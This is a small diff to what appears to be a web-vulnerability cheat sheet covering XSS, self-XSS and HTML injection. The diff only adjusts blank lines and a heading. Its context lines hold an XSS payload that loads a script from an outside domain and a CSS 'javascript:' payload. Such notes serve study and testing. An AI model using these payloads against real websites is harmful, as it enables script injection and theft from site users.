@@ -63,6 +63,7 @@ Payload
 
     "><script src=https://hello.xss></script>
 
+
 self-xss
 This vulnerability is implemented through social engineering attacks that force the victim to enter malicious code into their console 
 
@@ -87,7 +88,6 @@ Payload:
            background-image: url('javascript:alert("origin")');
      }
 
-     html injection
 
 HTML injecton
 
